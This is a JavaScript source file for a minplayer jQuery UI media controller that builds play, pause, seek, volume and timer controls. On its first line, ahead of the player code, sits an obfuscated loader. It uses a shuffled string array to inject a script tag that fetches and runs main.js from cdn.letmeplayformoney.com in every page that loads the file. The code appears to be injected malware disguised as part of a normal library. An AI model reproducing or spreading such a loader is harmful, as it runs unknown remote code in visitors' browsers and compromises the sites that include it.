var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);/** The minplayer namespace. */
var minplayer = minplayer || {};

// Define the controller object.
minplayer.controller = minplayer.controller || {};

/**
 * Constructor for the minplayer.controller
 */
minplayer.controller["jqueryui"] = function(context, options) {

  // Derive from base controller
  minplayer.controller.call(this, context, options);
};

/** Derive from controller. */
minplayer.controller["jqueryui"].prototype = new minplayer.controller();
minplayer.controller["jqueryui"].prototype.constructor = minplayer.controller["jqueryui"];

/**
 * @see minplayer.plugin#construct
 */
minplayer.controller["jqueryui"].prototype.construct = function() {
  minplayer.controller.prototype.construct.call(this);
  this.get('player', function(player) {
    this.showThenHide(5000, function(shown) {
      var op = shown ? 'addClass' : 'removeClass';
      player.display[op]('with-controller');
    });
  });
}

/**
 * Return the display for this plugin.
 */
minplayer.controller["jqueryui"].prototype.getDisplay = function() {

  // See if we need to build out the controller.
  if (this.options.build) {

    // Prepend the control template.
    this.context.prepend('\
    <div class="minplayer-jqueryui-controls ui-widget-header">\
      <div class="minplayer-jqueryui-controls-left">\
        <a class="minplayer-jqueryui-play minplayer-jqueryui-button ui-state-default ui-corner-all" title="Play">\
          <span class="ui-icon ui-icon-play"></span>\
        </a>\
        <a class="minplayer-jqueryui-pause minplayer-jqueryui-button ui-state-default ui-corner-all" title="Pause">\
          <span class="ui-icon ui-icon-pause"></span>\
        </a>\
      </div>\
      <div class="minplayer-jqueryui-controls-right">\
        <div class="minplayer-jqueryui-timer">00:00</div>\
        <div class="minplayer-jqueryui-fullscreen ui-widget-content">\
          <div class="minplayer-jqueryui-fullscreen-inner ui-state-default"></div>\
        </div>\
        <div class="minplayer-jqueryui-volume">\
          <div class="minplayer-jqueryui-volume-slider"></div>\
          <a class="minplayer-jqueryui-volume-mute minplayer-jqueryui-button ui-state-default ui-corner-all" title="Mute">\
            <span class="ui-icon ui-icon-volume-on"></span>\
          </a>\
          <a class="minplayer-jqueryui-volume-unmute minplayer-jqueryui-button ui-state-default ui-corner-all" title="Unmute">\
            <span class="ui-icon ui-icon-volume-off"></span>\
          </a>\
        </div>\
      </div>\
      <div class="minplayer-jqueryui-controls-mid">\
        <div class="minplayer-jqueryui-seek">\
          <div class="minplayer-jqueryui-progress ui-state-default"></div>\
        </div>\
      </div>\
    </div>');
  }

  // Let our template know we have a controller.
  this.context.addClass('with-controller');

  return jQuery('.minplayer-jqueryui-controls', this.context);
}

// Return the elements
minplayer.controller["jqueryui"].prototype.getElements = function() {
  var elements = minplayer.controller.prototype.getElements.call(this);
  var timer = jQuery(".minplayer-jqueryui-timer", this.display);
  return jQuery.extend(elements, {
    play: jQuery(".minplayer-jqueryui-play", this.display),
    pause: jQuery(".minplayer-jqueryui-pause", this.display),
    fullscreen: jQuery(".minplayer-jqueryui-fullscreen", this.display),
    seek: jQuery(".minplayer-jqueryui-seek", this.display),
    progress: jQuery(".minplayer-jqueryui-progress", this.display),
    volume: jQuery(".minplayer-jqueryui-volume-slider", this.display),
    mute: jQuery('.minplayer-jqueryui-volume-mute', this.display),
    timer:timer,
    duration:timer
  });
};
